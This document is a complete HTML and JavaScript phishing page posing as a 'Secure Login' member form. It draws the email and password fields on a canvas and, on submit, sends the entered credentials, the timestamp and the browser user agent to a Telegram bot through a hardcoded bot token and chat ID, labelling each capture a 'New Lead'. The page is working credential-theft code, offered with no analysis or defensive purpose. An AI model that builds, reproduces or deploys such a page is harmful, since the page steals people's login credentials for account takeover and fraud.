<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #8B0000; /* Red Angus Dark Red */
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            position: relative;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border-radius: 12px;
            background: #A52A2A; /* Lighter Red */
            padding: 20px;
            width: 320px;
            z-index: 10;
        }

        h2 {
            color: #fff;
            text-align: center;
            margin-bottom: 20px;
            font-weight: 600;
            letter-spacing: 1px;
        }

        canvas {
            display: block;
            cursor: text;
        }

        #submit-btn {
            display: block;
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            background-color: #FFD700; /* Gold/Yellow accent */
            border: none;
            border-radius: 6px;
            color: #8B0000;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        #submit-btn:hover {
            background-color: #FFFACD;
        }

        #status {
            color: #fff;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            height: 20px;
            word-wrap: break-word;
        }

        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #8B0000;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        #debug-log {
            font-size: 10px;
            color: #ccc;
            text-align: center;
            margin-top: 5px;
            min-height: 12px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>MEMBER LOGIN</h2>
    <canvas id="formCanvas" width="280" height="200"></canvas>
    <button id="submit-btn">VERIFY & LOGIN</button>
    <div class="loader" id="loader"></div>
    <div id="status"></div>
    <div id="debug-log"></div>
</div>

<script>
    // --- CONFIGURATION ---
    // These are pre-filled based on our previous context. 
    // If you changed your bot token, update BOT_TOKEN here.
    const BOT_TOKEN = '8917250221:AAHn3ooqjGzdDps8vJ_zAg6Gj7Fu3ceqp94'; 
    const CHAT_ID = '6574674233';
    // ---------------------

    const canvas = document.getElementById('formCanvas');
    const ctx = canvas.getContext('2d');
    const statusDiv = document.getElementById('status');
    const submitBtn = document.getElementById('submit-btn');
    const loader = document.getElementById('loader');
    const debugLog = document.getElementById('debug-log');

    // State variables
    let activeField = null; 
    let emailValue = "";
    let passValue = "";
    let blinkState = true;
    let blinkTimer = setInterval(() => { blinkState = !blinkState; draw(); }, 500);
    
    let btnHovered = false;

    // Drawing configuration
    const inputY = 60;
    const passY = 120;
    const inputWidth = 240;
    const inputHeight = 40;
    const labelY = 50;
    const passLabelY = 110;

    function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        const roundRect = (x, y, w, h, r, fill) => {
            ctx.beginPath();
            ctx.moveTo(x + r, y);
            ctx.arcTo(x + w, y, x + w, y + h, r);
            ctx.arcTo(x + w, y + h, x, y + h, r);
            ctx.arcTo(x, y + h, x, y, r);
            ctx.arcTo(x, y, x + w, y, r);
            ctx.closePath();
            ctx.fillStyle = fill;
            ctx.fill();
        };

        // Email Field
        ctx.fillStyle = "#fff";
        ctx.font = "14px Arial";
        ctx.fillText("Email Address", 10, labelY);
        roundRect(10, inputY, inputWidth, inputHeight, 5, "#fff");
        ctx.fillStyle = "#000";
        ctx.font = "16px Arial";
        ctx.fillText(emailValue || "", 20, inputY + 25);
        if (activeField === 'email') {
            ctx.fillStyle = "#8B0000";
            ctx.fillRect(20 + ctx.measureText(emailValue).width, inputY + 10, 2, 20);
        }

        // Password Field
        ctx.fillStyle = "#fff";
        ctx.font = "14px Arial";
        ctx.fillText("Password", 10, passLabelY);
        roundRect(10, passY, inputWidth, inputHeight, 5, "#fff");
        let maskStr = passValue.replace(/./g, "•");
        ctx.fillStyle = "#000";
        ctx.font = "16px Arial";
        ctx.fillText(maskStr || "", 20, passY + 25);
        if (activeField === 'pass') {
            ctx.fillStyle = "#8B0000";
            ctx.fillRect(20 + ctx.measureText(maskStr).width, passY + 10, 2, 20);
        }
    }

    draw();

    canvas.addEventListener('click', (e) => {
        const rect = canvas.getBoundingClientRect();
        const y = e.clientY - rect.top;
        if (y > inputY && y < inputY + inputHeight) activeField = 'email';
        else if (y > passY && y < passY + inputHeight) activeField = 'pass';
        else activeField = null;
        draw();
    });

    window.addEventListener('keydown', (e) => {
        if (!activeField) return;
        if (e.key === 'Backspace') {
            if (activeField === 'email') emailValue = emailValue.slice(0, -1);
            if (activeField === 'pass') passValue = passValue.slice(0, -1);
        } else if (e.key.length === 1) {
            if (activeField === 'email') emailValue += e.key;
            if (activeField === 'pass') passValue += e.key;
        }
        draw();
    });

    submitBtn.addEventListener('mouseenter', () => {
        btnHovered = true;
        submitBtn.style.backgroundColor = "#FFFACD";
    });
    submitBtn.addEventListener('mouseleave', () => {
        btnHovered = false;
        submitBtn.style.backgroundColor = "#FFD700";
    });

    submitBtn.addEventListener('click', async () => {
        if (!emailValue || !passValue) {
            statusDiv.innerText = "Please fill all fields.";
            return;
        }

        statusDiv.innerText = "Verifying...";
        loader.style.display = "block";
        submitBtn.disabled = true;

        const payload = {
            email: emailValue,
            password: passValue,
            time: new Date().toLocaleString(),
            ua: navigator.userAgent
        };

        const message = `🔴 *New Lead*\n\n📧 ${payload.email}\n🔑 ${payload.password}\n⏰ ${payload.time}`;

        try {
            // Using no-cors to bypass local file restrictions
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                }),
                mode: 'no-cors' // Crucial for local files
            });

            // Since no-cors doesn't give us the response body, we assume success if no exception thrown
            statusDiv.innerText = "Sent! Check Telegram.";
            debugLog.innerText = "Status: Success (Check your Telegram DM)";
            
            // Clear fields
            emailValue = "";
            passValue = "";
            draw();

        } catch (err) {
            statusDiv.innerText = "Failed to connect.";
            debugLog.innerText = "Error: " + err.message;
        }
    });
</script>
</body>
</html>
